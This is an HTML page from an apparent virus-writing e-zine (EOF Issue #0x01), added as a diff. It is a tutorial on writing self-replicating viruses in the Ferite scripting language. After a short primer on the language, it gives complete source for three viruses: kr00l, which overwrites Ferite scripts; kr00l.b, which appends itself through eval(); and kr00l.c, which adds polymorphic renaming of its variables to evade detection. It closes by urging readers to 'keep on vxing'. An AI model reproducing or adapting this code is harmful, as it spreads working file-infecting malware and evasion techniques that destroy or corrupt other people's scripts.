@@ -1,0 +1,277 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: WarGame/EOF || <a style="text-decoration: none" href="../mainmenu/articles.htm"><span style="text-decoration: none">Back to articles</span></a> ||<hr></pre>
+<pre>
+
+
+
+                             ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+			     ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+			     ++++++++++              Ferite virus writing guide                  ++++++++++
+			     ++++++++++                   by WarGame,#eof                        ++++++++++
+			     ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+			     ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+
+1) Introduction
+
+2) The language
+
+3) Infection
+
+4) Polymorphism
+
+5) Final words
+
+
+
+
+
+
+
+1) Introduction
+
+        This is my first tutorial :) ... It could contain error or other shit so you are free to contact me
+	and tell me how much I am a d0rk :).
+	Some time ago browsing on the net I found a nice language called &quot;ferite&quot;, this tutorial will ( try to )
+	explain you how to write auto-replicant programs in that language.
+	And now it's time to go!!!!
+
+
+
+
+2) The language
+
+       Ferite is a mixed language, if you come from C or better C++ you will find it very simple, but you can use it
+       without any problems even if you are a php or perl programmer.
+       These are some examples of ferite scripting:
+
+       -- HelloWorld.fe --
+
+       uses &quot;console&quot;;
+       Console.println(&quot;Hello world!&quot;);
+
+       -- eof --
+
+       This is the simplest ferite script, you first need to include the &quot;console&quot; module to do I/O, then we can use
+       the method Console.println() to print a msg on console.
+       This is a very simple example of how to use ferite.
+
+       == Variables declaration ==
+
+       Ferite allows us to declare many types of variables but for our scope we will need only three data types:
+
+       string = string data type ( example: string lolo = &quot;R00t&quot;; )
+       number = integer data type ( example: number i = 0; )
+       object = useful to instance object class ( example: object current_dir = new Directory(&quot;.&quot;); )
+
+       == FOR-WHILE-IF-ELSE ==
+
+       Ferite has the common cycles of the other languages, I will not waste much time on them.
+       Their structures:
+
+       if(condition)
+       {
+          some shit ...
+       }
+
+       else
+       {
+          other shit ...
+       }
+
+       (note you can use multiple if :))
+
+       for(start_condition; condition_to_verify; thing_to_do_at_every_cycle)
+       {
+          some code ...
+       }
+
+       while(condition)
+       {
+          some code ...
+       }
+
+       == Functions declaration ==
+
+       You can declare functions in ferite like any other language, this is the structure of a function:
+
+       function function_name(parameters)
+       {
+           code to do ...
+	   return some_thing;
+       }
+
+       example code:
+
+       function sum(number a,number b)
+       {
+           return a + b;
+       }
+
+       This section is finished, go to virus writing !!!
+
+
+
+
+3) Infection
+
+       Ok, now it's the moment to make the real shit.
+       Before starting some useful things:
+
+       == Getting script path ==
+
+       Example code:
+
+       -- GetPath.fe --
+
+       uses &quot;console&quot;,&quot;sys&quot;;
+       string path = Sys.scriptName();
+       Console.println(&quot;My path is: $path&quot;);
+
+       -- eof --
+
+       == Finding victims script ==
+
+       -- FindVictims.fe --
+
+       uses &quot;console&quot;,&quot;filesystem&quot;,&quot;sys&quot;;
+       object current_dir = new Directory(&quot;.&quot;);
+       string files = &quot;&quot;;
+
+         while((files = current_dir.getEntry()) != &quot;&quot;)
+	 {
+                 if(String.index(files,&quot;.fe&quot;) != -1)
+		 {
+		     Console.println(&quot;New victim: $files&quot;);
+		 }
+	}
+
+	-- eof --
+
+	== File I/O ==
+
+	-- File_io.fe --
+
+	uses &quot;console&quot;,&quot;sys&quot;,&quot;filesystem&quot;;
+        File.create(&quot;Hello_world.txt&quot;).writeln(&quot;Hello world!&quot;);
+
+	-- eof --
+
+	This is an overwriter ferite virus that will explain better all these things:
+
+-- kr00l.fe --
+
+// Hi, this is an overwriter virus written in ferite ... its name is kr00l
+// by [WarGame,#eof] ... you can get ferite here: http://www.ferite.org
+
+uses &quot;console&quot;,&quot;sys&quot;,&quot;filesystem&quot;;
+
+// useful objects
+object folder = new Directory(&quot;.&quot;);
+string found_file = &quot;&quot;;
+string my_code = &quot;&quot;;
+number infections = -1; // to avoid counting itself
+
+     // read its code
+     my_code = File.open(Sys.scriptName()).toString();
+
+     // Let's search
+      while((found_file = folder.getEntry()) != &quot;&quot;)
+      {
+         // is it a ferite script ?
+	 if((String.index(found_file,&quot;.fe&quot;)) != -1)
+	 {
+            File.remove(found_file);
+	    File.create(found_file).writeln(my_code);
+	    infections++;
+	 }
+      }
+
+      if(infections &gt; 0)
+      {
+  Console.println(&quot;I am kr00l by [WarGame,#eof], [infections:$infections]&quot;);
+      }
+
+-- eof --
+
+
+        == Appending ==
+
+	This is the better way to infect a ferite script, I did some experiments with prepending and it didn't work
+	well, so I tried appending and it seems to work quite well.
+	Ferite interpreter checks the validity of the source, for example you can't use &quot;uses&quot; twice or declare
+	variables after functions or other code.
+	After many hours ( my brain was burning :) ) I found an other way to do it, I used eval().
+	If you are a perl or php programmer you know what eval() is, it's a function that let you &quot;build&quot; your
+	code and execute it, for example eval('uses &quot;console&quot;; Console.println(&quot;I am in eval()&quot;); ');.
+	After having this idea kr00l.b was burn and it infected its first victim :)
+	This is the code:
+
+	-- kr00l.b.fe --
+
+	eval('uses &quot;filesystem&quot;,&quot;sys&quot;;function Is_Infected(string fl) { string st = File.open(fl).toString(); if(String.index(st,&quot;kr00l.b by [WarGame,#eof]&quot;) != -1) {return 1;} else {return 0;}} string signature =  &quot;kr00l.b by [WarGame,#eof]&quot;;string fl = &quot;&quot;;string my_code = &quot;&quot;;object pr = File.open(Sys.scriptName());string orig = &quot;&quot;;object dir = new Directory(&quot;.&quot;); while(String.index((my_code = pr.readln()),signature) == -1) {} while((fl = dir.getEntry()) != &quot;&quot;) { if(String.index(Sys.scriptName(),fl) == -1 &amp;&amp; String.index(fl,&quot;.fe&quot;) != -1) {  if(!Is_Infected(fl)) { orig = File.open(fl).toString(); File.remove(fl); File.create(fl).writeln(orig+my_code); } } } ');
+
+
+
+
+
+
+// This is the evolution of the kr00l ferite virus, it appends to victim scripts ... have fun with it by [WarGame,#eof]
+
+        -- eof --
+
+	How you can see the code is all on one line and it works in a simple way, it finds its victims
+	in the current directory and appends its code at the end of it.
+	Nothing of special only some things to note:
+
+	if(String.index(Sys.scriptName(),fl) == -1 &amp;&amp; String.index(fl,&quot;.fe&quot;) != -1)
+
+	This is to check if a found file is or not a ferite script, but I had to add another condition,
+	it is to ensure that the virus itself doesn't get infected and so corrupted.
+
+
+
+
+4) Polymorphism
+
+        Polymorphism is simple with ferite, you need only the function Regexp.replaceAll(), with this you can change
+	variables names and functions names to make the virus look different at every infection.
+	No other things to do only an example of appender virus with poly in it:
+
+	-- kr00l.c.fe --
+
+	eval('uses &quot;filesystem&quot;,&quot;sys&quot;,&quot;regexp&quot;,&quot;math&quot;,&quot;string&quot;,&quot;date&quot;;function Is_Infected(string fl) { string st = File.open(fl).toString(); if(String.index(st,&quot;kr00l.c by [WarGame,#eof]&quot;) != -1) {return 1;} else {return 0;}} function rnd(number sd) { Math.srand(sd); return String.sprintf(&quot;%c%c%c%c&quot;,((Math.rand()%10)+65),((Math.rand()%10)+65),((Math.rand()%10)+65),((Math.rand()%10)+65));} string signature = &quot;kr00l.c by [WarGame,#eof]&quot;;string fl = &quot;&quot;;string my_code = &quot;&quot;;object pr =  File.open(Sys.scriptName());string orig = &quot;&quot;;object dir = new Directory(&quot;.&quot;); while(String.index((my_code = pr.readln()),signature) == -1) {} if(1) { my_code = Regexp.replaceAll(&quot;signature&quot;,my_code,rnd(Date.now()+1989)); my_code = Regexp.replaceAll(&quot;orig&quot;,my_code,rnd(Date.now()+1992)); my_code = Regexp.replaceAll(&quot;dir&quot;,my_code,rnd(Date.now()+1922)); my_code = Regexp.replaceAll(&quot;fl&quot;,my_code,rnd(Date.now()+1981)); my_code = Regexp.replaceAll(&quot;Is_Infected&quot;,my_code,rnd(Date.now()+1975)); my_code = Regexp.replaceAll(&quot;rnd&quot;,my_code,rnd(Date.now()+1960));  my_code = Regexp.replaceAll(&quot;my_code&quot;,my_code,rnd(Date.now()+2006));} while((fl = dir.getEntry()) != &quot;&quot;) { if(String.index(Sys.scriptName(),fl) == -1 &amp;&amp; String.index(fl,&quot;.fe&quot;) != -1) {  if(!Is_Infected(fl)) { orig = File.open(fl).toString(); File.remove(fl); File.create(fl).writeln(orig+my_code); } } } ');
+
+
+
+
+
+
+//  Evolution of kr00l.b with poly ... its name is kr00l.c ... by [WarGame,#eof]
+
+         -- eof --
+
+	 Like kr00l.b this virus contained only on one line, the poly works in a very simple way, this is an example:
+	 Regexp.replaceAll(&quot;signature&quot;,my_code,rnd(Date.now()+1989)); , this will change every instance of the variable &quot;signature&quot;
+	 with a random generated string.
+	 The same is made with the other variables and functions.
+
+
+
+
+
+5) Final words
+
+        I would like to thank the other members of EOF, SkyOut for trusting me and for the big discussion on IRC, berniee
+	and RadiatioN for the help, izee and Nibble for being so friendly with me, and sk0r for his good idea of ransomware.
+	For contact check http://www.eof-project.net or send me an email to wargame89@yahoo.it
+	I hope this small tutorial will help you and remember to keep on vxing !!!
+
+
+	&quot;So di non sapere&quot; ( Socrate )
+</pre></body></html>
